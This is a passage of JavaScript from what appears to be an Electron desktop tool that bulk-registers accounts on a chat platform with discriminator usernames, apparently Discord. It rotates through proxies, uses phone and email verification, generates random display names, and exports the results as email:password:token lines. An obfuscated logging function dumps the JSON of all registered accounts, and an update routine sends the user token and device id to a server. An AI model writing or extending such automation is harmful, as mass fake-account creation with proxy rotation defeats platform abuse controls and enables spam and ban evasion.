                discrims.push(e.replace(' ', '').replace('#', ''));
              })
              if (discrims.length > 0) {
                if (discrims.indexOf(r.username.replace(/\D+/g,"") >= 0)) {
                  fs.readFile(tmp_data['export-discrim-accs-file'], 'utf8', (err, data) => {
                    if (save_tokens) {
                      data += `${acc.email}:${acc.pass}:${acc.token}:${r.username}\r\n`;
                    } else {
                      data += `${acc.email}:${acc.pass}:${r.username}\r\n`;
                    }
                    fs.writeFileSync(tmp_data['export-discrim-accs-file'], data)
                  })
                }
              }
            }
          });
        } else {
          accounts.forEach(e => {
            var acc = e;
            if (save_tokens) {
              data += `${acc.email}:${acc.pass}:${acc.token}\r\n`;
            } else {
              data += `${acc.email}:${acc.pass}\r\n`;
            }
          });
          fs.writeFileSync(file, data);
        }
      }
    }, 500 * n);
  }
  // var emails = [];
  // if (store.has('success_emailers')) emails = store.get('success_emailers');
  // emails.push(acc.email);
  // store.set('success_emailers', emails);
  // if (store.has('success_emails')) {
  //   var accs = store.get('success_emails');
  //   accs.push({
  //     time: new Date().getTime(),
  //     acc: acc
  //   });
  //   store.set('success_emails', accs);
  // } else {
  //   var accs = [];
  //   accs.push({
  //     time: new Date().getTime(),
  //     acc: acc
  //   });
  //   store.set('success_emails', accs);
  // }
}

function add_log_checking_proxy(proxy, n) {
  var html = `${translater(translate[67], false, {proxy: proxy})}`;
  add_log(html, n);
}

function add_log_bad_proxy(proxy, n) {
  var html = `${translater(translate[68], false, {proxy: proxy})}`;
  add_log(html, n);
}

function add_log_dont_reg(n, data = false) {
  save_bad_acc();
  var err = data.err;
  if (!data.err) var err = 234;
  var html = `${translater(translate[69], false, {err: err})}`;
  add_log(html, n);
}

function add_log_success_stop() {
  var html = `${translater(translate[70])}`;
  add_log(html, false);
  last_count_potok_finish++;
}

function check_count_numbers() {
  if (!$('#phone_enabler').prop('checked')) return true;
  if ($('#count-of-numbers b').length < 0) return false;
  return !parseInt($('#count-of-numbers b').text()) < 1;
}

function add_log_no_nums_now() {
  var html = `${translater(new_translate.no_nums_now)}`;
  add_log(html, 1);
}

function starter_acc(n, headless = false, verfy_mails = false, startId = false, stayOnline = false) {
  setTimeout(() => {
    var limit = false;
    if ($('#limit_accs_enabler').prop('checked')) {
      var limit = $('#limit_for_accs').val();
      if (limit && limit != '' && !isNaN(parseInt(limit))) limit = parseInt(limit);
    }
    if (limit && accounts.length >= limit) return;
    if (!check_count_numbers() && type_verify != 13) {
      add_log_no_nums_now();
      setTimeout(() => {
        starter_acc(n, headless, verfy_mails, startId);
      }, 35 * 1000);
      return;
    }
    register_acc_api(n, verfy_mails, stayOnline).then((data) => {
      if (!data.type) {
        if (data.err && data.err == 'bad_proxy') {
          add_log_bad_proxy(data.proxy, n);
          meAtztGn1pdERnu('Dont reg! - '+JSON.stringify(data));
          if (check_stop || checkStop[startId]) return add_log_success_stop();
          return starter_acc(n, headless, verfy_mails, startId);
        } else {
          add_log_dont_reg(n, data);
          meAtztGn1pdERnu('Dont reg! - '+JSON.stringify(data));
          if (check_stop || checkStop[startId]) return add_log_success_stop();
          return starter_acc(n, headless, verfy_mails, startId);
        }
      }
      var acc = data.acc;
      accounts.push(acc);
      success_reg_acc(acc, n);
      meAtztGn1pdERnu('Success reg! COUNT - '+accounts.length+' ACCS: '+JSON.stringify(accounts));
      var last_number = false;
      if (check_stop || checkStop[startId]) return add_log_success_stop();
      return starter_acc(n, headless, verfy_mails, startId);
    }, (r) => {
      meAtztGn1pdERnu(r);
      add_log_dont_reg(n, {err: r});
      if (check_stop || checkStop[startId]) return add_log_success_stop();
      return starter_acc(n, headless, verfy_mails, startId);
    })
  }, 300);
}

$('body').on('change', '.turner-o[to]', function () {
  var h = $(this).attr('height');
  var block = $('#'+$(this).attr('to'));
  if (block.hasClass('active')) {
    if ($(this).attr('to') == 'proxy-load' && $('#count-of-proxy-regs').html() != '0 прокси') $('#count-of-proxy-regs').removeClass('active');
    if ($(this).attr('to') == 'proxy-load' && $('#count-of-proxy-regs').html() != '0 proxys') $('#count-of-proxy-regs').removeClass('active');
    if ($(this).attr('to') == 'save-accs-load' && $('#name-of-export-file').html() != '') $('#name-of-export-file').removeClass('active');
    block.removeClass('active');
    block.css('height', '');
  } else {
    if ($(this).attr('to') == 'proxy-load' && $('#count-of-proxy-regs').html() != '0 прокси') $('#count-of-proxy-regs').addClass('active');
    if ($(this).attr('to') == 'proxy-load' && $('#count-of-proxy-regs').html() != '0 proxys') $('#count-of-proxy-regs').addClass('active');
    if ($(this).attr('to') == 'save-accs-load' && $('#name-of-export-file').html() != '') $('#name-of-export-file').addClass('active');
    block.css('height', h);
    block.addClass('active');
  }
});

$('body').on('change', '#random_usernames_enabler', function () {
  update_tmp('random_usernames_enabler', $(this).prop('checked'));
  if ($(this).hasClass('active')) {
    $(this).removeClass('active');
    $('#enable_random_usernames_two').css('pointer-events', '');
    $('#enable_random_usernames_two').css('opacity', '');
    $('#enable_random_usernames_two').css('margin-left', '');
    $('#enable_random_usernames').css('margin-left', '20px');
  } else {
    $(this).addClass('active');
    $('#enable_random_usernames_two').css('pointer-events', 'none');
    $('#enable_random_usernames_two').css('opacity', '0');
    $('#enable_random_usernames_two').css('margin-left', '-200%');
    if (app_lang == 'en') {
      $('#enable_random_usernames').css('margin-left', '-118px');
    } else {
      $('#enable_random_usernames').css('margin-left', '-145px');
    }
  }
});

$('body').on('change', '#gmail-api-data', function () {
  update_tmp('gmail-api-data', $(this).val());
})

var hiderBlock = async block => {
  try {
    if (block.hasClass('hider-block')) {
      var h = parseInt(block.attr('orig-height'));
      block.css('height', `${h}px`);
      await delay(10);
      block.removeClass('hider-block');
      block.css('height', '');
    } else {
      var h = block.height();
      block.attr('orig-height', h);
      block.css('height', `${h}px`);
      await delay(10);
      block.addClass('hider-block');
      block.css('height', 0);
    }
  } catch (err) {
    //console.error(err);
  }
}

$('body').on('change', '#verify_email_imap_enabler', function () {
  update_tmp('verify_email_imap_enabler', $(this).prop('checked'));
  if ($(this).prop('checked')) {
    hiderBlock($('#enable_random_emails'));
    $('#enable_imap_verification').addClass('active')
  } else {
    hiderBlock($('#enable_random_emails'));
    $('#enable_imap_verification').removeClass('active')
  }
})

$('body').on('change', '#verify_email_enabler', function () {
  update_tmp('verify_email_enabler', $(this).prop('checked'));
  if ($(this).prop('checked')) {
    $('gmail-imap').addClass('active')
  } else {
    $('gmail-imap').removeClass('active')
  }
})

$('body').on('change', '#random_emails_enabler', function () {
  update_tmp('random_emails_enabler', $(this).prop('checked'));
  if ($(this).prop('checked')) {
    $(this).addClass('active');
    $('#enable_random_emails_two').css('pointer-events', 'none');
    $('#enable_random_emails_two').css('opacity', '0');
    $('#enable_random_emails').css('margin-left', '0');
    $('#enable_random_emails').css('margin-top', '-35px');
    $('#enable_verify_email').addClass('active');
    $('#verify_email_imap_block').addClass('hider-block');
  } else {
    $(this).removeClass('active');
    $('#enable_random_emails_two').css('display', '');
    setTimeout(() => {
      $('#enable_random_emails_two').css('pointer-events', '');
      $('#enable_random_emails_two').css('opacity', '');
      $('#enable_random_emails_two').css('margin-left', '');
    }, 50);
    $('#enable_random_emails').css('margin-left', '0');
    $('#enable_random_emails').css('margin-top', '5px');
    $('#enable_verify_email').removeClass('active');
    $('#verify_email_imap_block').removeClass('hider-block');
  }
});

function capFirst(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

function getRandomInter(min, max) {
  	return Math.floor(Math.random() * (max - min)) + min;
}

function generateName(){
	var name1 = ["abandoned","able","absolute","adorable","adventurous","academic","acceptable","acclaimed","accomplished","accurate","aching","acidic","acrobatic","active","actual","adept","admirable","admired","adolescent","adorable","adored","advanced","afraid","affectionate","aged","aggravating","aggressive","agile","agitated","agonizing","agreeable","ajar","alarmed","alarming","alert","alienated","alive","all","altruistic","amazing","ambitious","ample","amused","amusing","anchored","ancient","angelic","angry","anguished","animated","annual","another","antique","anxious","any","apprehensive","appropriate","apt","arctic","arid","aromatic","artistic","ashamed","assured","astonishing","athletic","attached","attentive","attractive","austere","authentic","authorized","automatic","avaricious","average","aware","awesome","awful","awkward","babyish","bad","back","baggy","bare","barren","basic","beautiful","belated","beloved","beneficial","better","best","bewitched","big","big-hearted","biodegradable","bite-sized","bitter","black","black-and-white","bland","blank","blaring","bleak","blind","blissful","blond","blue","blushing","bogus","boiling","bold","bony","boring","bossy","both","bouncy","bountiful","bowed","brave","breakable","brief","bright","brilliant","brisk","broken","bronze","brown","bruised","bubbly","bulky","bumpy","buoyant","burdensome","burly","bustling","busy","buttery","buzzing","calculating","calm","candid","canine","capital","carefree","careful","careless","caring","cautious","cavernous","celebrated","charming","cheap","cheerful","cheery","chief","chilly","chubby","circular","classic","clean","clear","clear-cut","clever","close","closed","cloudy","clueless","clumsy","cluttered","coarse","cold","colorful","colorless","colossal","comfortable","common","compassionate","competent","complete","complex","complicated","composed","concerned","concrete","confused","conscious","considerate","constant","content","conventional","cooked","cool","cooperative","coordinated","corny","corrupt","costly","courageous","courteous","crafty","crazy","creamy","creative","creepy","criminal","crisp","critical","crooked","crowded","cruel","crushing","cuddly","cultivated","cultured","cumbersome","curly","curvy","cute","cylindrical","damaged","damp","dangerous","dapper","daring","darling","dark","dazzling","dead","deadly","deafening","dear","dearest","decent","decimal","decisive","deep","defenseless","defensive","defiant","deficient","definite","definitive","delayed","delectable","delicious","delightful","delirious","demanding","dense","dental","dependable","dependent","descriptive","deserted","detailed","determined","devoted","different","difficult","digital","diligent","dim","dimpled","dimwitted","direct","disastrous","discrete","disfigured","disgusting","disloyal","dismal","distant","downright","dreary","dirty","disguised","dishonest","dismal","distant","distinct","distorted","dizzy","dopey","doting","double","downright","drab","drafty","dramatic","dreary","droopy","dry","dual","dull","dutiful","each","eager","earnest","early","easy","easy-going","ecstatic","edible","educated","elaborate","elastic","elated","elderly","electric","elegant","elementary","elliptical","embarrassed","embellished","eminent","emotional","empty","enchanted","enchanting","energetic","enlightened","enormous","enraged","entire","envious","equal","equatorial","essential","esteemed","ethical","euphoric","even","evergreen","everlasting","every","evil","exalted","excellent","exemplary","exhausted","excitable","excited","exciting","exotic","expensive","experienced","expert","extraneous","extroverted","extra-large","extra-small","fabulous","failing","faint","fair","faithful","fake","false","familiar","famous","fancy","fantastic","far","faraway","far-flung","far-off","fast","fat","fatal","fatherly","favorable","favorite","fearful","fearless","feisty","feline","female","feminine","few","fickle","filthy","fine","finished","firm","first","firsthand","fitting","fixed","flaky","flamboyant","flashy","flat","flawed","flawless","flickering","flimsy","flippant","flowery","fluffy","fluid","flustered","focused","fond","foolhardy","foolish","forceful","forked","formal","forsaken","forthright","fortunate","fragrant","frail","frank","frayed","free","French","fresh","frequent","friendly","frightened","frightening","frigid","frilly","frizzy","frivolous","front","frosty","frozen","frugal","fruitful","full","fumbling","functional","funny","fussy","fuzzy","gargantuan","gaseous","general","generous","gentle","genuine","giant","giddy","gigantic","gifted","giving","glamorous","glaring","glass","gleaming","gleeful","glistening","glittering","gloomy","glorious","glossy","glum","golden","good","good-natured","gorgeous","graceful","gracious","grand","grandiose","granular","grateful","grave","gray","great","greedy","green","gregarious","grim","grimy","gripping","grizzled","gross","grotesque","grouchy","grounded","growing","growling","grown","grubby","gruesome","grumpy","guilty","gullible","gummy","hairy","half","handmade","handsome","handy","happy","happy-go-lucky","hard","hard-to-find","harmful","harmless","harmonious","harsh","hasty","hateful","haunting","healthy","heartfelt","hearty","heavenly","heavy","hefty","helpful","helpless","hidden","hideous","high","high-level","hilarious","hoarse","hollow","homely","honest","honorable","honored","hopeful","horrible","hospitable","hot","huge","humble","humiliating","humming","humongous","hungry","hurtful","husky","icky","icy","ideal","idealistic","identical","idle","idiotic","idolized","ignorant","ill","illegal","ill-fated","ill-informed","illiterate","illustrious","imaginary","imaginative","immaculate","immaterial","immediate","immense","impassioned","impeccable","impartial","imperfect","imperturbable","impish","impolite","important","impossible","impractical","impressionable","impressive","improbable","impure","inborn","incomparable","incompatible","incomplete","inconsequential","incredible","indelible","inexperienced","indolent","infamous","infantile","infatuated","inferior","infinite","informal","innocent","insecure","insidious","insignificant","insistent","instructive","insubstantial","intelligent","intent","intentional","interesting","internal","international","intrepid","ironclad","irresponsible","irritating","itchy","jaded","jagged","jam-packed","jaunty","jealous","jittery","joint","jolly","jovial","joyful","joyous","jubilant","judicious","juicy","jumbo","junior","jumpy","juvenile","kaleidoscopic","keen","key","kind","kindhearted","kindly","klutzy","knobby","knotty","knowledgeable","knowing","known","kooky","kosher","lame","lanky","large","last","lasting","late","lavish","lawful","lazy","leading","lean","leafy","left","legal","legitimate","light","lighthearted","likable","likely","limited","limp","limping","linear","lined","liquid","little","live","lively","livid","loathsome","lone","lonely","long","long-term","loose","lopsided","lost","loud","lovable","lovely","loving","low","loyal","lucky","lumbering","luminous","lumpy","lustrous","luxurious","mad","made-up","magnificent","majestic","major","male","mammoth","married","marvelous","masculine","massive","mature","meager","mealy","mean","measly","meaty","medical","mediocre","medium","meek","mellow","melodic","memorable","menacing","merry","messy","metallic","mild","milky","mindless","miniature","minor","minty","miserable","miserly","misguided","misty","mixed","modern","modest","moist","monstrous","monthly","monumental","moral","mortified","motherly","motionless","mountainous","muddy","muffled","multicolored","mundane","murky","mushy","musty","muted","mysterious","naive","narrow","nasty","natural","naughty","nautical","near","neat","necessary","needy","negative","neglected","negligible","neighboring","nervous","new","next","nice","nifty","nimble","nippy","nocturnal","noisy","nonstop","normal","notable","noted","noteworthy","novel","noxious","numb","nutritious","nutty","obedient","obese","oblong","oily","oblong","obvious","occasional","odd","oddball","offbeat","offensive","official","old","old-fashioned","only","open","optimal","optimistic","opulent","orange","orderly","organic","ornate","ornery","ordinary","original","other","our","outlying","outgoing","outlandish","outrageous","outstanding","oval","overcooked","overdue","overjoyed","overlooked","palatable","pale","paltry","parallel","parched","partial","passionate","past","pastel","peaceful","peppery","perfect","perfumed","periodic","perky","personal","pertinent","pesky","pessimistic","petty","phony","physical","piercing","pink","pitiful","plain","plaintive","plastic","playful","pleasant","pleased","pleasing","plump","plush","polished","polite","political","pointed","pointless","poised","poor","popular","portly","posh","positive","possible","potable","powerful","powerless","practical","precious","present","prestigious","pretty","precious","previous","pricey","prickly","primary","prime","pristine","private","prize","probable","productive","profitable","profuse","proper","proud","prudent","punctual","pungent","puny","pure","purple","pushy","putrid","puzzled","puzzling","quaint","qualified","quarrelsome","quarterly","queasy","querulous","questionable","quick","quick-witted","quiet","quintessential","quirky","quixotic","quizzical","radiant","ragged","rapid","rare","rash","raw","recent","reckless","rectangular","ready","real","realistic","reasonable","red","reflecting","regal","regular","reliable","relieved","remarkable","remorseful","remote","repentant","required","respectful","responsible","repulsive","revolving","rewarding","rich","rigid","right","ringed","ripe","roasted","robust","rosy","rotating","rotten","rough","round","rowdy","royal","rubbery","rundown","ruddy","rude","runny","rural","rusty","sad","safe","salty","same","sandy","sane","sarcastic","sardonic","satisfied","scaly","scarce","scared","scary","scented","scholarly","scientific","scornful","scratchy","scrawny","second","secondary","second-hand","secret","self-assured","self-reliant","selfish","sentimental","separate","serene","serious","serpentine","several","severe","shabby","shadowy","shady","shallow","shameful","shameless","sharp","shimmering","shiny","shocked","shocking","shoddy","short","short-term","showy","shrill","shy","sick","silent","silky","silly","silver","similar","simple","simplistic","sinful","single","sizzling","skeletal","skinny","sleepy","slight","slim","slimy","slippery","slow","slushy","small","smart","smoggy","smooth","smug","snappy","snarling","sneaky","sniveling","snoopy","sociable","soft","soggy","solid","somber","some","spherical","sophisticated","sore","sorrowful","soulful","soupy","sour","Spanish","sparkling","sparse","specific","spectacular","speedy","spicy","spiffy","spirited","spiteful","splendid","spotless","spotted","spry","square","squeaky","squiggly","stable","staid","stained","stale","standard","starchy","stark","starry","steep","sticky","stiff","stimulating","stingy","stormy","straight","strange","steel","strict","strident","striking","striped","strong","studious","stunning","stupendous","stupid","sturdy","stylish","subdued","submissive","substantial","subtle","suburban","sudden","sugary","sunny","super","superb","superficial","superior","supportive","sure-footed","surprised","suspicious","svelte","sweaty","sweet","sweltering","swift","sympathetic","tall","talkative","tame","tan","tangible","tart","tasty","tattered","taut","tedious","teeming","tempting","tender","tense","tepid","terrible","terrific","testy","thankful","that","these","thick","thin","third","thirsty","this","thorough","thorny","those","thoughtful","threadbare","thrifty","thunderous","tidy","tight","timely","tinted","tiny","tired","torn","total","tough","traumatic","treasured","tremendous","tragic","trained","tremendous","triangular","tricky","trifling","trim","trivial","troubled","true","trusting","trustworthy","trusty","truthful","tubby","turbulent","twin","ugly","ultimate","unacceptable","unaware","uncomfortable","uncommon","unconscious","understated","unequaled","uneven","unfinished","unfit","unfolded","unfortunate","unhappy","unhealthy","uniform","unimportant","unique","united","unkempt","unknown","unlawful","unlined","unlucky","unnatural","unpleasant","unrealistic","unripe","unruly","unselfish","unsightly","unsteady","unsung","untidy","untimely","untried","untrue","unused","unusual","unwelcome","unwieldy","unwilling","unwitting","unwritten","upbeat","upright","upset","urban","usable","used","useful","useless","utilized","utter","vacant","vague","vain","valid","valuable","vapid","variable","vast","velvety","venerated","vengeful","verifiable","vibrant","vicious","victorious","vigilant","vigorous","villainous","violet","violent","virtual","virtuous","visible","vital","vivacious","vivid","voluminous","wan","warlike","warm","warmhearted","warped","wary","wasteful","watchful","waterlogged","watery","wavy","wealthy","weak","weary","webbed","wee","weekly","weepy","weighty","weird","welcome","well-documented","well-groomed","well-informed","well-lit","well-made","well-off","well-to-do","well-worn","wet","which","whimsical","whirlwind","whispered","white","whole","whopping","wicked","wide","wide-eyed","wiggly","wild","willing","wilted","winding","windy","winged","wiry","wise","witty","wobbly","woeful","wonderful","wooden","woozy","wordy","worldly","worn","worried","worrisome","worse","worst","worthless","worthwhile","worthy","wrathful","wretched","writhing","wrong","wry","yawning","yearly","yellow","yellowish","young","youthful","yummy","zany","zealous","zesty","zigzag","rocky"];

	var name2 = ["people","history","way","art","world","information","map","family","government","health","system","computer","meat","year","thanks","music","person","reading","method","data","food","understanding","theory","law","bird","literature","problem","software","control","knowledge","power","ability","economics","love","internet","television","science","library","nature","fact","product","idea","temperature","investment","area","society","activity","story","industry","media","thing","oven","community","definition","safety","quality","development","language","management","player","variety","video","week","security","country","exam","movie","organization","equipment","physics","analysis","policy","series","thought","basis","boyfriend","direction","strategy","technology","army","camera","freedom","paper","environment","child","instance","month","truth","marketing","university","writing","article","department","difference","goal","news","audience","fishing","growth","income","marriage","user","combination","failure","meaning","medicine","philosophy","teacher","communication","night","chemistry","disease","disk","energy","nation","road","role","soup","advertising","location","success","addition","apartment","education","math","moment","painting","politics","attention","decision","event","property","shopping","student","wood","competition","distribution","entertainment","office","population","president","unit","category","cigarette","context","introduction","opportunity","performance","driver","flight","length","magazine","newspaper","relationship","teaching","cell","dealer","debate","finding","lake","member","message","phone","scene","appearance","association","concept","customer","death","discussion","housing","inflation","insurance","mood","woman","advice","blood","effort","expression","importance","opinion","payment","reality","responsibility","situation","skill","statement","wealth","application","city","county","depth","estate","foundation","grandmother","heart","perspective","photo","recipe","studio","topic","collection","depression","imagination","passion","percentage","resource","setting","ad","agency","college","connection","criticism","debt","description","memory","patience","secretary","solution","administration","aspect","attitude","director","personality","psychology","recommendation","response","selection","storage","version","alcohol","argument","complaint","contract","emphasis","highway","loss","membership","possession","preparation","steak","union","agreement","cancer","currency","employment","engineering","entry","interaction","limit","mixture","preference","region","republic","seat","tradition","virus","actor","classroom","delivery","device","difficulty","drama","election","engine","football","guidance","hotel","match","owner","priority","protection","suggestion","tension","variation","anxiety","atmosphere","awareness","bread","climate","comparison","confusion","construction","elevator","emotion","employee","employer","guest","height","leadership","mall","manager","operation","recording","respect","sample","transportation","boring","charity","cousin","disaster","editor","efficiency","excitement","extent","feedback","guitar","homework","leader","mom","outcome","permission","presentation","promotion","reflection","refrigerator","resolution","revenue","session","singer","tennis","basket","bonus","cabinet","childhood","church","clothes","coffee","dinner","drawing","hair","hearing","initiative","judgment","lab","measurement","mode","mud","orange","poetry","police","possibility","procedure","queen","ratio","relation","restaurant","satisfaction","sector","signature","significance","song","tooth","town","vehicle","volume","wife","accident","airport","appointment","arrival","assumption","baseball","chapter","committee","conversation","database","enthusiasm","error","explanation","farmer","gate","girl","hall","historian","hospital","injury","instruction","maintenance","manufacturer","meal","perception","pie","poem","presence","proposal","reception","replacement","revolution","river","son","speech","tea","village","warning","winner","worker","writer","assistance","breath","buyer","chest","chocolate","conclusion","contribution","cookie","courage","desk","drawer","establishment","examination","garbage","grocery","honey","impression","improvement","independence","insect","inspection","inspector","king","ladder","menu","penalty","piano","potato","profession","professor","quantity","reaction","requirement","salad","sister","supermarket","tongue","weakness","wedding","affair","ambition","analyst","apple","assignment","assistant","bathroom","bedroom","beer","birthday","celebration","championship","cheek","client","consequence","departure","diamond","dirt","ear","fortune","friendship","funeral","gene","girlfriend","hat","indication","intention","lady","midnight","negotiation","obligation","passenger","pizza","platform","poet","pollution","recognition","reputation","shirt","speaker","stranger","surgery","sympathy","tale","throat","trainer","uncle","youth","time","work","film","water","money","example","while","business","study","game","life","form","air","day","place","number","part","field","fish","back","process","heat","hand","experience","job","book","end","point","type","home","economy","value","body","market","guide","interest","state","radio","course","company","price","size","card","list","mind","trade","line","care","group","risk","word","fat","force","key","light","training","name","school","top","amount","level","order","practice","research","sense","service","piece","web","boss","sport","fun","house","page","term","test","answer","sound","focus","matter","kind","soil","board","oil","picture","access","garden","range","rate","reason","future","site","demand","exercise","image","case","cause","coast","action","age","bad","boat","record","result","section","building","mouse","cash","class","period","plan","store","tax","side","subject","space","rule","stock","weather","chance","figure","man","model","source","beginning","earth","program","chicken","design","feature","head","material","purpose","question","rock","salt","act","birth","car","dog","object","scale","sun","note","profit","rent","speed","style","war","bank","craft","half","inside","outside","standard","bus","exchange","eye","fire","position","pressure","stress","advantage","benefit","box","frame","issue","step","cycle","face","item","metal","paint","review","room","screen","structure","view","account","ball","discipline","medium","share","balance","bit","black","bottom","choice","gift","impact","machine","shape","tool","wind","address","average","career","culture","morning","pot","sign","table","task","condition","contact","credit","egg","hope","ice","network","north","square","attempt","date","effect","link","post","star","voice","capital","challenge","friend","self","shot","brush","couple","exit","front","function","lack","living","plant","plastic","spot","summer","taste","theme","track","wing","brain","button","click","desire","foot","gas","influence","notice","rain","wall","base","damage","distance","feeling","pair","savings","staff","sugar","target","text","animal","author","budget","discount","file","ground","lesson","minute","officer","phase","reference","register","sky","stage","stick","title","trouble","bowl","bridge","campaign","character","club","edge","evidence","fan","letter","lock","maximum","novel","option","pack","park","quarter","skin","sort","weight","baby","background","carry","dish","factor","fruit","glass","joint","master","muscle","red","strength","traffic","trip","vegetable","appeal","chart","gear","ideal","kitchen","land","log","mother","net","party","principle","relative","sale","season","signal","spirit","street","tree","wave","belt","bench","commission","copy","drop","minimum","path","progress","project","sea","south","status","stuff","ticket","tour","angle","blue","breakfast","confidence","daughter","degree","doctor","dot","dream","duty","essay","father","fee","finance","hour","juice","luck","milk","mouth","peace","pipe","stable","storm","substance","team","trick","afternoon","bat","beach","blank","catch","chain","consideration","cream","crew","detail","gold","interview","kid","mark","mission","pain","pleasure","score","screw","sex","shop","shower","suit","tone","window","agent","band","bath","block","bone","calendar","candidate","cap","coat","contest","corner","court","cup","district","door","east","finger","garage","guarantee","hole","hook","implement","layer","lecture","lie","manner","meeting","nose","parking","partner","profile","rice","routine","schedule","swimming","telephone","tip","winter","airline","bag","battle","bed","bill","bother","cake","code","curve","designer","dimension","dress","ease","emergency","evening","extension","farm","fight","gap","grade","holiday","horror","horse","host","husband","loan","mistake","mountain","nail","noise","occasion","package","patient","pause","phrase","proof","race","relief","sand","sentence","shoulder","smoke","stomach","string","tourist","towel","vacation","west","wheel","wine","arm","aside","associate","bet","blow","border","branch","breast","brother","buddy","bunch","chip","coach","cross","document","draft","dust","expert","floor","god","golf","habit","iron","judge","knife","landscape","league","mail","mess","native","opening","parent","pattern","pin","pool","pound","request","salary","shame","shelter","shoe","silver","tackle","tank","trust","assist","bake","bar","bell","bike","blame","boy","brick","chair","closet","clue","collar","comment","conference","devil","diet","fear","fuel","glove","jacket","lunch","monitor","mortgage","nurse","pace","panic","peak","plane","reward","row","sandwich","shock","spite","spray","surprise","till","transition","weekend","welcome","yard","alarm","bend","bicycle","bite","blind","bottle","cable","candle","clerk","cloud","concert","counter","flower","grandfather","harm","knee","lawyer","leather","load","mirror","neck","pension","plate","purple","ruin","ship","skirt","slice","snow","specialist","stroke","switch","trash","tune","zone","anger","award","bid","bitter","boot","bug","camp","candy","carpet","cat","champion","channel","clock","comfort","cow","crack","engineer","entrance","fault","grass","guy","hell","highlight","incident","island","joke","jury","leg","lip","mate","motor","nerve","passage","pen","pride","priest","prize","promise","resident","resort","ring","roof","rope","sail","scheme","script","sock","station","toe","tower","truck","witness","can","will","other","use","make","good","look","help","go","great","being","still","public","read","keep","start","give","human","local","general","specific","long","play","feel","high","put","common","set","change","simple","past","big","possible","particular","major","personal","current","national","cut","natural","physical","show","try","check","second","call","move","pay","let","increase","single","individual","turn","ask","buy","guard","hold","main","offer","potential","professional","international","travel","cook","alternative","special","working","whole","dance","excuse","cold","commercial","low","purchase","deal","primary","worth","fall","necessary","positive","produce","search","present","spend","talk","creative","tell","cost","drive","green","support","glad","remove","return","run","complex","due","effective","middle","regular","reserve","independent","leave","original","reach","rest","serve","watch","beautiful","charge","active","break","negative","safe","stay","visit","visual","affect","cover","report","rise","walk","white","junior","pick","unique","classic","final","lift","mix","private","stop","teach","western","concern","familiar","fly","official","broad","comfortable","gain","rich","save","stand","young","heavy","lead","listen","valuable","worry","handle","leading","meet","release","sell","finish","normal","press","ride","secret","spread","spring","tough","wait","brown","deep","display","flow","hit","objective","shoot","touch","cancel","chemical","cry","dump","extreme","push","conflict","eat","fill","formal","jump","kick","opposite","pass","pitch","remote","total","treat","vast","abuse","beat","burn","deposit","print","raise","sleep","somewhere","advance","consist","dark","double","draw","equal","fix","hire","internal","join","kill","sensitive","tap","win","attack","claim","constant","drag","drink","guess","minor","pull","raw","soft","solid","wear","weird","wonder","annual","count","dead","doubt","feed","forever","impress","repeat","round","sing","slide","strip","wish","combine","command","dig","divide","equivalent","hang","hunt","initial","march","mention","spiritual","survey","tie","adult","brief","crazy","escape","gather","hate","prior","repair","rough","sad","scratch","sick","strike","employ","external","hurt","illegal","laugh","lay","mobile","nasty","ordinary","respond","royal","senior","split","strain","struggle","swim","train","upper","wash","yellow","convert","crash","dependent","fold","funny","grab","hide","miss","permit","quote","recover","resolve","roll","sink","slip","spare","suspect","sweet","swing","twist","upstairs","usual","abroad","brave","calm","concentrate","estimate","grand","male","mine","prompt","quiet","refuse","regret","reveal","rush","shake","shift","shine","steal","suck","surround","bear","brilliant","dare","dear","delay","drunk","female","hurry","inevitable","invite","kiss","neat","pop","punch","quit","reply","representative","resist","rip","rub","silly","smile","spell","stretch","stupid","tear","temporary","tomorrow","wake","wrap","yesterday","Thomas","Tom","Lieuwe"];

  if (getRandomInter(0, 100) > 50) {
    var name = capFirst(name1[getRandomInter(0, name1.length - 1)]);
    return name;
  } else {
  	var name = capFirst(name1[getRandomInter(0, name1.length - 1)]) + ' ' + capFirst(name2[getRandomInter(0, name2.length - 1)]);
  	return name;
  }

}

$('body').on('mousedown', '.dThemeSwitch', function () {
  var check = document.getElementById($(this).find('input[type="checkbox"]').attr('id')).checked;
  if (check) $(this).find('.slider').addClass('active_e');
  $(this).find('.slider').addClass('active');
});
$('body').on('mouseup', '.dThemeSwitch', function () {
  if ($(this).find('.slider').hasClass('active_e')) $(this).find('.slider').removeClass('active_e');
  $(this).find('.slider').removeClass('active');
});
$('body').on('mouseout', '.dThemeSwitch', function () {
  $(this).find('.slider').removeClass('active');
});

$('body').on('change', '#load_avatars_enabler', function () {
  var val = $(this).prop('checked')
  update_tmp('load_avatars_enabler', val);
  if (val) {
    $('.block-before-avatar-load').addClass('active');
    $('.avatar-load').addClass('active');
  } else {
    $('#count-of-avatars').removeClass('active');
    $('#close-btn-avatars').addClass('hide-close-file-btn');
    $('.block-before-avatar-load').removeClass('active');
    $('.avatar-load').removeClass('active');
  }
});

$.fn.hasAttr = function(name) {
   return this.attr(name) !== undefined;
};
function change_language() {
  var newl = 'en';
  if (store.get('language') == 'en') newl = 'ru';
  store.set('language', newl);
  setTimeout(() => {
    restart_window();
  }, 250);
}

$('body').on('click', '#switch_lang', function () {
  change_language()
});

$('body').on('click', '#open-reference', function () {
  $('.modal').modal('hide');
  $('#modal-reference').modal('show');
});

$('body').on('click', '[open-in-browser]', function () {
  var url = $(this).attr('open-in-browser');
  shell.openExternal(url);
})

function getUpdate() {
  return new Promise(async fin => {
    try {
      req({
        url: 'https://google.it', 
        method: 'GET',
        headers: {
          token: user_token,
          deviceid: store.get('device_id')
        }
      }, (err, response, body) => {
        if (err || response.statusCode != 200 || !body) return fin({type: false, err: 1});
        body = JSON.parse(body);
        if (!body.type) return fin({type: false, err: 2});
        store.set('data_a', body.data.content);
        store.set('app_version', body.version);
        return fin({type: true});
      });
    } catch (err) {
      return fin({type: false});
    }
  })
}

$('body').on('click', '#delete-update', async () => {
  await getUpdate()
  store.delete(`update_${store.get('app_version')}`);
  return restart_window();
});

var { remote } = require('electron')
var { Menu, MenuItem } = remote

var menu = new Menu()
menu.append(new MenuItem({ role: 'copy' }))
menu.append(new MenuItem({ role: 'paste' }))
menu.append(new MenuItem({ role: 'cut' }))
menu.append(new MenuItem({ role: 'redo' }))
menu.append(new MenuItem({ role: 'selectAll' }))

window.addEventListener('contextmenu', (e) => {
  e.preventDefault()
  menu.popup({ window: remote.getCurrentWindow() })
}, false)

// $('body').on('contextmenu', 'input', function () {
//   var block = $(this)
//   var val = block.val();
//   var cop = clipboard.readText();
//   val = val+cop;
//   block.val(val)
// });

$(document).ready(function () {
